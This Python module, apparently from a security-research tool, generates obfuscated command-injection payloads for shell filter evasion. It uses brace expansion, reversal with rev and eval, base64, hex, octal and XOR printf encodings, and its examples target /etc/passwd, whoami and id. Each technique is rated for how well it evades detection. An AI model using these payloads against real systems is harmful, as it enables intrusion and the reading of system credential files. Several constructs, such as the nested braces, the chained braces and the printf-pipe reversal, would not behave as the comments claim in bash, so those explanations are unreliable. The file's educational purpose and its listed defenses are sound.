"""
Advanced Command Injection Obfuscation Module
Sophisticated evasion techniques: Brace Expansion, String Reversal, Arithmetic Expansion

Author: Security Research Team
Purpose: Demonstrate advanced attacker techniques for educational purposes
WARNING: These techniques are highly effective at bypassing filters
"""

import base64
import random

class AdvancedObfuscator:
    """
    Advanced obfuscation techniques used by sophisticated attackers
    """
    
    def __init__(self):
        self.technique_count = 0
    
    # ==================== BRACE EXPANSION ABUSE ====================
    
    def brace_expand_basic(self, command, args=''):
        """
        Level 1: Basic brace expansion
        Transform: cat /etc/passwd → {cat,/etc/passwd}
        
        Args:
            command (str): Command to execute (e.g., 'cat')
            args (str): Arguments (e.g., '/etc/passwd')
        
        Returns:
            dict: Brace-expanded payload with analysis
        """
        if args:
            obfuscated = f"{{{command},{args}}}"
        else:
            obfuscated = command
        
        return {
            'original': f"{command} {args}" if args else command,
            'obfuscated': obfuscated,
            'technique': 'Basic Brace Expansion',
            'level': 1,
            'bypass_reason': 'No traditional separators (;, &&, ||, |) used - valid bash syntax',
            'detection': 'Hard - looks like legitimate brace usage',
            'example': 'cat /etc/passwd → {cat,/etc/passwd}',
            'shell_interpretation': f'Bash expands to: {command} {args}',
            'evasion_targets': ['Separator-based filters', 'Metacharacter detection'],
            'modern_defense': 'AST-based shell syntax parsing, input sanitization'
        }
    
    def brace_expand_nested(self, command, args=''):
        """
        Level 2: Nested brace expansion
        Transform: cat /etc/passwd → {{cat,/etc/passwd}}
        
        Args:
            command (str): Command
            args (str): Arguments
        
        Returns:
            dict: Nested brace expansion
        """
        if args:
            obfuscated = f"{{{{{command},{args}}}}}"
        else:
            obfuscated = f"{{{{{command}}}}}"
        
        return {
            'original': f"{command} {args}" if args else command,
            'obfuscated': obfuscated,
            'technique': 'Nested Brace Expansion',
            'level': 2,
            'bypass_reason': 'Double nesting bypasses simple brace detection',
            'detection': 'Very Hard',
            'example': 'cat /etc/passwd → {{cat,/etc/passwd}}',
            'shell_interpretation': 'Outer braces expand, then inner braces execute',
            'evasion_targets': ['Simple regex brace detection', 'Single-layer filters'],
            'note': 'Multiple expansion layers confuse parsers'
        }
    
    def brace_expand_chain(self, commands_list):
        """
        Level 3: Multi-command brace chaining
        Transform: ['whoami', 'id', 'pwd'] → {whoami;id;pwd}
        
        Args:
            commands_list (list): List of commands to chain
        
        Returns:
            dict: Chained brace expansion
        """
        if len(commands_list) == 1:
            obfuscated = commands_list[0]
        else:
            # Join with semicolons inside braces
            obfuscated = "{" + ";".join(commands_list) + "}"
        
        return {
            'original': ' && '.join(commands_list),
            'obfuscated': obfuscated,
            'technique': 'Multi-Command Brace Chaining',
            'level': 3,
            'bypass_reason': 'All commands execute sequentially within brace context',
            'detection': 'Hard',
            'example': 'whoami && id → {whoami;id}',
            'shell_interpretation': 'All commands execute in subshell',
            'evasion_targets': ['Command count validation', 'Separator filters'],
            'note': 'Multiple commands appear as single brace construct'
        }
    
    def brace_expand_wildcard_combo(self, command, path):
        """
        Level 4: Brace expansion + wildcard obfuscation
        Transform: cat /etc/passwd → {cat,/e??/p*wd}
        
        Args:
            command (str): Command
            path (str): Path with wildcards
        
        Returns:
            dict: Combined brace + wildcard
        """
        # Apply wildcard to path
        wildcard_path = path.replace('/etc/', '/e??/').replace('passwd', 'p*wd')
        obfuscated = f"{{{command},{wildcard_path}}}"
        
        return {
            'original': f"{command} {path}",
            'obfuscated': obfuscated,
            'technique': 'Brace + Wildcard Combo',
            'level': 4,
            'bypass_reason': 'Combines separator evasion with path obfuscation',
            'detection': 'Very Hard - requires dual-layer analysis',
            'example': 'cat /etc/passwd → {cat,/e??/p*wd}',
            'shell_interpretation': 'Wildcards expand, then brace executes',
            'evasion_targets': ['Separator filters', 'Path blacklists', 'Exact string matching'],
            'note': 'Most effective combination technique'
        }
    
    def brace_expand_with_variables(self, command, args):
        """
        Level 5: Brace expansion with variable obfuscation
        Transform: cat /etc/passwd → {$c$a$t,/etc/passwd} where c=c, a=a, t=t
        
        Args:
            command (str): Command to obfuscate
            args (str): Arguments
        
        Returns:
            dict: Brace + variable obfuscation
        """
        # Create variable assignments for each character
        var_assignments = []
        obfuscated_cmd = []
        
        for i, char in enumerate(command):
            var_name = f"v{i}"
            var_assignments.append(f"{var_name}={char}")
            obfuscated_cmd.append(f"${var_name}")
        
        setup = ';'.join(var_assignments) + ';'
        obfuscated = setup + f"{{'{''.join(obfuscated_cmd)},{args}}}"
        
        return {
            'original': f"{command} {args}",
            'obfuscated': obfuscated,
            'technique': 'Brace + Variable Expansion',
            'level': 5,
            'bypass_reason': 'Command constructed dynamically from variables',
            'detection': 'Extremely Hard - requires runtime analysis',
            'example': f"cat → v0=c;v1=a;v2=t;{{$v0$v1$v2,/etc/passwd}}",
            'shell_interpretation': 'Variables expand to command, brace executes',
            'evasion_targets': ['Command blacklists', 'Signature detection', 'Static analysis'],
            'note': 'Near-impossible to detect without execution'
        }
    
    # ==================== STRING REVERSAL ====================
    
    def reverse_with_rev(self, payload):
        """
        Level 1: Simple reversal with rev command
        Transform: cat /etc/passwd → rev<<<'dwssap/cte/ tac'
        
        Args:
            payload (str): Command to reverse
        
        Returns:
            dict: Reversed payload with rev
        """
        reversed_payload = payload[::-1]
        obfuscated = f"rev<<<'{reversed_payload}'"
        
        return {
            'original': payload,
            'reversed': reversed_payload,
            'obfuscated': obfuscated,
            'technique': 'String Reversal with rev',
            'level': 1,
            'bypass_reason': 'Payload signature doesn\'t exist until runtime reversal',
            'detection': 'Easy-Medium - look for rev command',
            'example': f"{payload} → rev<<<'{reversed_payload}'",
            'shell_interpretation': 'Here-string feeds reversed text to rev, which reverses it back',
            'evasion_targets': ['Exact string matching', 'Keyword blacklists'],
            'modern_defense': 'Flag usage of rev command in user input contexts'
        }
    
    def reverse_with_parameter_expansion(self, payload):
        """
        Level 2: Reversal with bash parameter expansion
        Transform: cat /etc/passwd → eval "$(echo 'dwssap/cte/ tac'|rev)"
        
        Args:
            payload (str): Command to reverse
        
        Returns:
            dict: Parameter expansion reversal
        """
        reversed_payload = payload[::-1]
        obfuscated = f'eval "$(echo \'{reversed_payload}\'|rev)"'
        
        return {
            'original': payload,
            'reversed': reversed_payload,
            'obfuscated': obfuscated,
            'technique': 'Parameter Expansion Reversal',
            'level': 2,
            'bypass_reason': 'Command constructed via eval, reversed at runtime',
            'detection': 'Medium - eval usage flags as suspicious',
            'example': f"{payload} → eval \"$(echo '{reversed_payload}'|rev)\"",
            'shell_interpretation': 'Echo reversed string, pipe to rev, eval result',
            'evasion_targets': ['Command blacklists', 'Static signature matching'],
            'modern_defense': 'Monitor eval + rev patterns, behavioral analysis'
        }
    
    def reverse_char_by_char(self, payload):
        """
        Level 3: Character-by-character reversal via parameter expansion
        Transform: cat → ${p:2:1}${p:1:1}${p:0:1} where p='cat'
        
        Args:
            payload (str): Command to reverse
        
        Returns:
            dict: Character-level reversal
        """
        var_name = 'p'
        extractions = []
        
        for i in range(len(payload) - 1, -1, -1):
            extractions.append(f"${{{var_name}:{i}:1}}")
        
        obfuscated = f"{var_name}='{payload}';" + ''.join(extractions)
        
        return {
            'original': payload,
            'obfuscated': obfuscated,
            'technique': 'Character-by-Character Reversal',
            'level': 3,
            'bypass_reason': 'String completely deconstructed, no signature exists',
            'detection': 'Hard - requires understanding parameter extraction logic',
            'example': f"cat → p='cat';${{p:2:1}}${{p:1:1}}${{p:0:1}}",
            'shell_interpretation': 'Extract each character in reverse order',
            'evasion_targets': ['All string-based detection', 'Signature matching'],
            'modern_defense': 'Runtime behavior monitoring, parameter expansion limits'
        }
    
    def reverse_base64_combo(self, payload):
        """
        Level 4: Reversal + Base64 encoding combination
        Transform: cat /etc/passwd → echo BASE64(reversed)|base64 -d|rev
        
        Args:
            payload (str): Command
        
        Returns:
            dict: Multi-layer obfuscation
        """
        reversed_payload = payload[::-1]
        encoded = base64.b64encode(reversed_payload.encode()).decode()
        obfuscated = f"echo {encoded}|base64 -d|rev"
        
        return {
            'original': payload,
            'reversed': reversed_payload,
            'base64_encoded': encoded,
            'obfuscated': obfuscated,
            'technique': 'Reversal + Base64 Combo',
            'level': 4,
            'bypass_reason': 'Two-layer transformation: reverse then encode',
            'detection': 'Very Hard - requires decode + reverse to analyze',
            'example': f"{payload} → [reversed+base64]|base64 -d|rev",
            'shell_interpretation': 'Decode base64, then reverse the reversed string',
            'evasion_targets': ['Signature detection', 'Pattern matching', 'Static analysis'],
            'modern_defense': 'Multi-stage pipeline detection, sandbox execution'
        }
    
    def reverse_with_printf(self, payload):
        """
        Level 5: Advanced reversal using printf loops
        Creates a reversed string using printf character-by-character
        
        Args:
            payload (str): Command
        
        Returns:
            dict: Printf-based reversal
        """
        # Build printf statements for each character in reverse
        printf_cmds = []
        for char in reversed(payload):
            printf_cmds.append(f"printf '{char}'")
        
        obfuscated = '|'.join(printf_cmds)
        
        return {
            'original': payload,
            'obfuscated': obfuscated,
            'technique': 'Printf Loop Reversal',
            'level': 5,
            'bypass_reason': 'No rev command, manual character reconstruction',
            'detection': 'Extremely Hard',
            'example': f"cat → printf 't'|printf 'a'|printf 'c' (simplified)",
            'shell_interpretation': 'Each printf outputs one character',
            'evasion_targets': ['rev command detection', 'All reversal signatures'],
            'note': 'Avoids rev entirely'
        }
    
    # ==================== ARITHMETIC EXPANSION ====================
    
    def ascii_to_char_basic(self, payload):
        """
        Level 1: ASCII to character via printf hex
        Transform: cat → $(printf "\\x63\\x61\\x74")
        
        Args:
            payload (str): Command
        
        Returns:
            dict: Hex ASCII conversion
        """
        hex_values = ''.join([f"\\x{ord(c):02x}" for c in payload])
        obfuscated = f'$(printf "{hex_values}")'
        
        return {
            'original': payload,
            'hex_representation': hex_values,
            'obfuscated': obfuscated,
            'technique': 'ASCII Hex Conversion',
            'level': 1,
            'bypass_reason': 'Command represented as hex ASCII values',
            'detection': 'Medium - printf hex patterns detectable',
            'example': f"cat → $(printf \"\\x63\\x61\\x74\")",
            'ascii_values': {char: f"0x{ord(char):02x}" for char in payload},
            'shell_interpretation': 'Printf converts hex to characters',
            'evasion_targets': ['Keyword blacklists', 'String matching'],
            'modern_defense': 'Pattern detection for printf hex sequences'
        }
    
    def ascii_to_char_octal(self, payload):
        """
        Level 2: ASCII to character via octal
        Transform: cat → $(printf "\\143\\141\\164")
        
        Args:
            payload (str): Command
        
        Returns:
            dict: Octal ASCII conversion
        """
        octal_values = ''.join([f"\\{oct(ord(c))[2:]:0>3}" for c in payload])
        obfuscated = f'$(printf "{octal_values}")'
        
        return {
            'original': payload,
            'octal_representation': octal_values,
            'obfuscated': obfuscated,
            'technique': 'ASCII Octal Conversion',
            'level': 2,
            'bypass_reason': 'Octal notation bypasses hex-specific detection',
            'detection': 'Hard - less common than hex',
            'example': f"cat → $(printf \"\\143\\141\\164\")",
            'ascii_values': {char: f"0o{oct(ord(char))[2:]}" for char in payload},
            'shell_interpretation': 'Printf interprets octal escape sequences',
            'evasion_targets': ['Hex-based detection', 'Keyword filters'],
            'modern_defense': 'Generic printf escape sequence detection'
        }
    
    def ascii_arithmetic_nested(self, payload):
        """
        Level 3: Nested arithmetic for ASCII generation
        Transform: cat → $(printf "\\$(printf %o 99)\\$(printf %o 97)\\$(printf %o 116)")
        
        Args:
            payload (str): Command
        
        Returns:
            dict: Nested arithmetic conversion
        """
        nested_printfs = []
        for char in payload:
            ascii_val = ord(char)
            nested_printfs.append(f"\\$(printf %o {ascii_val})")
        
        obfuscated = f'$(printf "{"".join(nested_printfs)}")'
        
        return {
            'original': payload,
            'obfuscated': obfuscated,
            'technique': 'Nested Arithmetic Printf',
            'level': 3,
            'bypass_reason': 'Double-layer printf obfuscation with dynamic octal',
            'detection': 'Very Hard - nested printf rarely detected',
            'example': f"c → $(printf \"\\$(printf %o 99)\")",
            'shell_interpretation': 'Inner printf generates octal, outer converts to char',
            'evasion_targets': ['Simple printf detection', 'Static ASCII patterns'],
            'modern_defense': 'Nested command substitution analysis'
        }
    
    def ascii_bitwise_construction(self, payload):
        """
        Level 4: Bitwise arithmetic for character construction
        Transform: w (119) → $((2^6+2^5+2^4+2^2+2^1+2^0))
        
        Args:
            payload (str): Command (single character works best for demo)
        
        Returns:
            dict: Bitwise character construction
        """
        def char_to_bitwise(char):
            ascii_val = ord(char)
            bits = []
            for i in range(7, -1, -1):
                if ascii_val & (1 << i):
                    bits.append(f"$((1<<{i}))")
            return '+'.join(bits) if bits else '0'
        
        # Build for first few characters as example
        bitwise_chars = []
        for char in payload[:3]:  # Limit for readability
            bitwise_expr = char_to_bitwise(char)
            bitwise_chars.append(f"\\$(printf %o $({bitwise_expr}))")
        
        obfuscated = f'$(printf "{"".join(bitwise_chars)}...")'
        
        return {
            'original': payload,
            'obfuscated': obfuscated,
            'technique': 'Bitwise Arithmetic Construction',
            'level': 4,
            'bypass_reason': 'ASCII values computed via bitwise operations',
            'detection': 'Extremely Hard - requires runtime evaluation',
            'example': f"'w'(119) → $((1<<6)))+$((1<<5))+...+$((1<<0)))",
            'shell_interpretation': 'Bitwise shifts calculate ASCII value',
            'evasion_targets': ['All static analysis', 'Signature detection'],
            'modern_defense': 'Only behavioral/runtime analysis can detect',
            'note': 'Example shows first 3 chars for readability'
        }
    
    def ascii_xor_obfuscation(self, payload, xor_key=42):
        """
        Level 5: XOR-based character generation
        Transform: Each char XOR'd with key, then decoded at runtime
        
        Args:
            payload (str): Command
            xor_key (int): XOR key (0-255)
        
        Returns:
            dict: XOR-obfuscated payload
        """
        xor_values = []
        for char in payload:
            xored = ord(char) ^ xor_key
            xor_values.append(f"\\$(printf %o $(({xored}^{xor_key})))")
        
        obfuscated = f'$(printf "{"".join(xor_values)}")'
        
        return {
            'original': payload,
            'obfuscated': obfuscated,
            'xor_key': xor_key,
            'technique': 'XOR Arithmetic Obfuscation',
            'level': 5,
            'bypass_reason': 'Polymorphic - different key = different payload',
            'detection': 'Extremely Hard - changes with each key',
            'example': f"With key={xor_key}, 'c' → $(({ord('c')}^{xor_key})) = {ord('c')^xor_key}",
            'shell_interpretation': 'XOR operation decoded at runtime',
            'evasion_targets': ['Signature matching', 'Pattern detection', 'Static analysis'],
            'polymorphic': 'True - random key generates unique payload each time',
            'modern_defense': 'Only sandbox/runtime execution can detect'
        }
    
    # ==================== COMBINATION TECHNIQUES ====================
    
    def ultimate_obfuscation(self, command, args=''):
        """
        Combine all three advanced techniques
        Brace + Reversal + Arithmetic
        
        Args:
            command (str): Command
            args (str): Arguments
        
        Returns:
            dict: Maximum obfuscation payload
        """
        # Step 1: Reverse the command
        reversed_cmd = command[::-1]
        
        # Step 2: Convert to hex
        hex_cmd = ''.join([f"\\x{ord(c):02x}" for c in reversed_cmd])
        
        # Step 3: Wrap in brace expansion with rev
        obfuscated = f"{{eval,$(printf \"{hex_cmd}\"|rev)}}"
        
        return {
            'original': f"{command} {args}" if args else command,
            'obfuscated': obfuscated,
            'technique': 'Ultimate Obfuscation (Brace+Reversal+Arithmetic)',
            'level': 'MAXIMUM',
            'bypass_reason': 'Three-layer transformation: arithmetic→reversal→brace',
            'detection': 'Nearly Impossible without execution',
            'transformation_steps': [
                f"1. Command: {command}",
                f"2. Reversed: {reversed_cmd}",
                f"3. Hex encoded: {hex_cmd}",
                f"4. Brace wrapped with rev: {obfuscated}"
            ],
            'shell_interpretation': 'Printf hex, rev reverses back, eval executes, brace wraps',
            'evasion_targets': ['ALL detection methods except runtime analysis'],
            'modern_defense': 'Requires full sandbox execution to analyze',
            'warning': 'Extremely sophisticated - for advanced research only'
        }

# Preset configurations
ADVANCED_PRESETS = {
    'brace_basic': {
        'method': 'brace_expand_basic',
        'description': 'Basic brace expansion',
        'level': 1
    },
    'brace_wildcard': {
        'method': 'brace_expand_wildcard_combo',
        'description': 'Brace + wildcard combo',
        'level': 4
    },
    'reverse_simple': {
        'method': 'reverse_with_rev',
        'description': 'Simple string reversal',
        'level': 1
    },
    'reverse_advanced': {
        'method': 'reverse_base64_combo',
        'description': 'Reversal + Base64',
        'level': 4
    },
    'arithmetic_hex': {
        'method': 'ascii_to_char_basic',
        'description': 'Hex ASCII conversion',
        'level': 1
    },
    'arithmetic_bitwise': {
        'method': 'ascii_bitwise_construction',
        'description': 'Bitwise construction',
        'level': 4
    },
    'ultimate': {
        'method': 'ultimate_obfuscation',
        'description': 'Maximum obfuscation',
        'level': 'MAX'
    }
}

if __name__ == '__main__':
    print("=" * 70)
    print("ADVANCED COMMAND INJECTION OBFUSCATION MODULE")
    print("=" * 70)
    
    obfuscator = AdvancedObfuscator()
    
    # Test brace expansion
    print("\n[BRACE EXPANSION TEST]")
    result = obfuscator.brace_expand_basic("cat", "/etc/passwd")
    print(f"Original: {result['original']}")
    print(f"Obfuscated: {result['obfuscated']}")
    print(f"Bypasses: {', '.join(result['evasion_targets'])}")
    
    # Test string reversal
    print("\n[STRING REVERSAL TEST]")
    result = obfuscator.reverse_with_rev("whoami")
    print(f"Original: {result['original']}")
    print(f"Obfuscated: {result['obfuscated']}")
    
    # Test arithmetic expansion
    print("\n[ARITHMETIC EXPANSION TEST]")
    result = obfuscator.ascii_to_char_basic("cat")
    print(f"Original: {result['original']}")
    print(f"Obfuscated: {result['obfuscated']}")
    print(f"ASCII values: {result['ascii_values']}")
    
    print("\n" + "=" * 70)
    print("Available presets:", list(ADVANCED_PRESETS.keys()))
